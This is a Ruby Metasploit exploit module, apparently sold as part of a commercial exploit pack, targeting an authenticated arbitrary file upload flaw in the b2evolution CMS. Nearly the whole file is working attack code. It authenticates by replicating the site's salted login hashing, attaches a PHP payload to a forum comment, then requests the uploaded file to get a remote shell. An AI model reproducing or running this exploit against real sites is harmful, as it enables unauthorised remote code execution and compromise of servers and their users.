##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'b2evolution Authenticated Arbitrary File Upload',
      'Description' => %q{
    This module exploits an authenticated arbitrary file upload vulnerability in order to gain a remote shell.

    The b2evolution forums and content management system is a popular open-source foundation
    for custom applications, communities, and discussion boards. This module exploits a flaw
    in the comment functionality in that authenticated users can attach an arbitrary file
    to a comment which is reachable from the web root. This allows an attacker to upload
    an arbitrary PHP script and gain remote code execution.

    Categories: Open Source

    Price: 5

    Video: https://asciinema.org/a/1iy14jnxxdyqk4zkxady61y3e

    OS: Multi

    Arch: Multi

    Requirements: Metasploit Framework
      },
      'Author' =>
        [
        ],
      'License' => 'VolatileMinds',
      'References' =>
        [
          ['EDB', '41011']
        ],
      'Privileged' => false,
      'Platform'   => ['php'],
      'Arch'       => ARCH_PHP,
      'Payload'    =>
        {
          'BadChars' => "&\n=+%",
        },
      'Targets' =>
        [
          [ 'Automatic', { } ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => ''))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base b2evolution directory path", '/']),
        OptString.new('FORUMURI', [true, 'The URI to a forum post', nil])
      ], self.class)
  end

  def exploit
        res = send_request_cgi({
          'uri' => normalize_uri(target_uri.path, 'index.php'),
              'method' => 'POST',
              'vars_get' => {
                'disp' => 'login',
                'redirect_to' => '/',
                'return_to' => '/',
                'source' => 'menu link'
              }
            })

            cookie = res.get_cookies
            loginsalt = $1 if res && res.body =~ /'crumb_loginsalt': '(.*?)',/
            padding = $1 if res && res.body =~ /form.q.value = '(.*?)' \+ sessionid;/

            res = send_request_cgi({
              'uri' => normalize_uri(target_uri.path, 'htsrv/anon_async.php'),
              'method' => 'POST',
              'vars_post' => {
                'x' => datastore['USERNAME'],
                'action' => 'get_user_salt',
                'get_widget_login_hidden_fields' => true,
                'crumb_loginsalt' => loginsalt
              },
              'cookie' => cookie
            })
            salts = JSON.parse(res.body)
            pwdsalt = salts['pwd_salt']
            session_id = salts['session_id']
            crumb_loginform = salts['crumb']
            hashed_pw = datastore['PASSWORD']
            salts['salts'].each do |salt|
              hashed_pw = Digest::SHA1.hexdigest(Digest::MD5.hexdigest(salt + hashed_pw) + pwdsalt)
            end

            res = send_request_cgi({
              'uri' => normalize_uri(target_uri.path, 'index.php'),
              'method' => 'POST',
              'vars_get' => {
                'disp' => 'login',
                'redirect_to' => '/',
                'return_to' => '/',
                'source' => 'menu link'
              },
              'vars_post' => {
                'pwd_hashed[]' => hashed_pw,
                'login_action[login]' => 1,
                'x' => datastore['USERNAME'],
                'q' => padding + session_id,
                'crumb_loginform' => crumb_loginform,
                'source' => 'menu link',
                'redirect_to' => '/',
                'disp' => 'login',
                'return_to' => '/',
                'inskin' => 1,
                'pwd_salt' => pwdsalt
              },
              'cookie' => cookie
            })

            unless res && res.code == 303
              fail_with(Failure::Unknown, "Authentication failed")
            end


              res = send_request_cgi({
                'uri' => normalize_uri(target_uri.path, 'index.php') + datastore['FORUMURI'],
                'cookie' => cookie
              })

              crumb_comment = $1 if res && res.body =~ /<input name="crumb_comment" type="hidden" value="(.*?)" \/>/
              preview = $1 if res && res.body =~ /<input type="submit" class="preview btn-info btn" name="submit_comment_post_(.*?)\[preview\]" value="Preview\/Add file"/

          data = Rex::MIME::Message.new
          filename = "#{Rex::Text.rand_text_alpha(9)}.php".downcase
          data.add_part('<?php ' + payload.encoded + ' ?>', 'text/plain', nil, "form-data; name=\"uploadfile[]\"; filename=\"#{filename}\"")
          data.add_part('', nil, nil, "form-data; name=\"comment_rating\"")
          data.add_part('', nil, nil, "form-data; name=\"g\"")
          data.add_part('1', nil, nil, "form-data; name=\"renderers_displayed\"")
          data.add_part('b2evMark', nil, nil, "form-data; name=\"renderers[]\"")
          data.add_part('Preview/Add file', nil, nil, "form-data; name=\"submit_comment_post_#{preview}[preview]\"")
          data.add_part(crumb_comment, nil, nil, "form-data; name=\"crumb_comment\"")
          data.add_part('comment', nil, nil, 'form-data; name="comment_type"')
          data.add_part(preview, nil, nil, 'form-data; name="comment_item_ID"')
          data.add_part('/', nil, nil, 'form-data; name="redirect_to"')

          res = send_request_cgi({
            'uri' => normalize_uri(target_uri.path, 'htsrv', 'comment_post.php'),
            'cookie' => cookie,
            'method' => 'POST',
            'ctype' => 'multipart/form-data; boundary=' + data.bound,
            'data' => data.to_s
          })

          send_request_cgi({
            'uri' => normalize_uri(target_uri.path, 'media', 'users', datastore['USERNAME'], 'comments', 'p'+preview, filename)
          })

  end
end
